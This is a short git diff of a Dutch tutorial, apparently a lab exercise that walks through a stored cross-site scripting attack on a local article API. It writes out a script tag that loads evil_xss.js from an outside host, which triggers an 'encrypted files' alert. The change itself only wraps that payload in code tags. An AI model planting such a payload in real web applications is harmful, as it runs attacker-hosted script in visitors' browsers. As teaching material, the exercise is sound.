@@ -28,7 +28,7 @@ Kopieer de 'Request url' onder het Curl stukje (bijv. http://localhost:9080/api/
 Gebruik de url in de browser.<br>
 Er is nu een alert melding te zien.<br>
 Voek een nieuwe article toe met in het veld description:<br>
-<script src='http://home.kpn.nl/vuwu57lx/evil_xss.js'></script><br>
+<code><script src='http://home.kpn.nl/vuwu57lx/evil_xss.js'></script></code><br>
 Gebruik van de url van dit nieuwe article (bijv. http://localhost:9080/api/article/getArticleById?id=3)<br>
 geeft nu een melding in de browser m.b.t. encrypted files<br>
 
